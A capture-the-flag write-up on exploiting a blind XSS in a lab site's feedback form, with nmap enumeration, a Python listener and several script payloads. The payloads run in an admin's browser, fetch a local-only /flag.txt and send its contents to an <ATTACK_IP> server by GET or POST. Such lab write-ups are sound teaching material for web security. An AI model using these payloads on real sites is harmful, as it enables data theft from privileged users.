## TL;DR (so you don‚Äôt have to scroll)
Found a blind XSS in the feedback form. Pushed a tiny JS payload that runs in the admin‚Äôs browser, reads `/flag.txt` (local-only), and exfiltrates it back to my webserver. Decode the URI and boom ‚Äî flag. Easy, obnoxious, effective.

---

## ENUMERATION
As always: quick port sweep first.

```bash
nmap -p- --min-rate 2000 -vv -T4 <IP>
````

Found open ports: `22`, `8080`. Move to a focused scan:

```bash
nmap -p 22,8080 -sC -sV -vv -oN scan.nmap <IP>
```

Website looked normal. Checked `/flag.txt` (obligatory), but of course it‚Äôs not public. HTML source didn‚Äôt scream ‚Äúhere‚Äôs a vuln‚Äù ‚Äî but forms are sneaky. Always check feedback forms.

## PORT 8080 ‚Äî BLIND XSS

The feedback form probably stores content and later renders it in an admin‚Äôs browser. That smells like **blind XSS**: payload runs in a different user‚Äôs browser (usually admin) and you only see the result if you have an out-of-band listener.

Idea: make the admin‚Äôs browser fetch something only they can access (like `http://127.0.0.1:8080/flag.txt`) and forward it to our server.

Spin up a tiny HTTP server to catch exfil requests:

```bash
# on your attacker machine
python3 -m http.server 80
# or use any other listener you want
```

First, test that blind XSS works by injecting a script tag that loads an external script:

```html
'"><script src="http://<ATTACK_IP>/"></script>
```

If your server gets a hit, the script loaded in admin‚Äôs browser ‚Äî bingo, blind XSS. Screenshot:
![Blind\_XSS](screenshots/blindXSS.png)

To confirm where the payload executes (useful debug), send window.location back:

```html
'"><script>
fetch("http://<ATTACK_IP>/" + window.location)
</script>
```

If that triggers a 404 on your server with the location appended, you‚Äôve confirmed code executes in the admin‚Äôs browser (screenshot: ![Location](screenshots/location.png)).

---

## THE REAL PAYLOAD ‚Äî GET THE FLAG

This payload runs in the admin's context, fetches the local `/flag.txt`, and forwards its contents to your server (URI-encoded so it survives URLs).

```html
'"><script>
fetch("http://127.0.0.1:8080/flag.txt")
  .then(response => response.text())
  .then(data => {
    fetch("http://<ATTACK_IP>/" + encodeURIComponent(data));
  });
</script>
```

Paste that into the feedback form and submit. Wait for your server to receive a GET with the encoded flag. You‚Äôll see something like:

```
GET /FLAG%7Bthis_is_my_encoded_flag%7D HTTP/1.1
```

Then decode it (any URL decoder ‚Äî browser devtools, `python -c "import urllib.parse; print(urllib.parse.unquote('FLAG%7B...%7D'))"`, whatever). Ta-da ‚Äî flag.

## WHY THIS WORKS (short & chill)

* The site stores our input then renders it in a privileged user‚Äôs browser (admin).
* XSS executes in admin‚Äôs origin ‚Äî the admin can access `127.0.0.1:8080/flag.txt` that we cannot.
* By making admin fetch `/flag.txt` and forward it to our listener, we exfiltrate a local-only file.
* CBC? No ‚Äî this is just classic blind XSS and same-origin privilege abuse. Simple but effective when the app trusts stored input.

---

## Notes / gotchas

* Use `encodeURIComponent()` so special chars in the flag don‚Äôt break the URL.
* If you want prettier exfil: base64 the response before sending, or POST it to reduce URL-length issues. Example (POST version):

```html
'"><script>
fetch("http://127.0.0.1:8080/flag.txt")
  .then(r => r.text())
  .then(d => fetch("http://<ATTACK_IP>/catch", { method: "POST", body: d }));
</script>
```

* Cookie flags, CSP, and modern security headers can block this. When they don‚Äôt, you win.
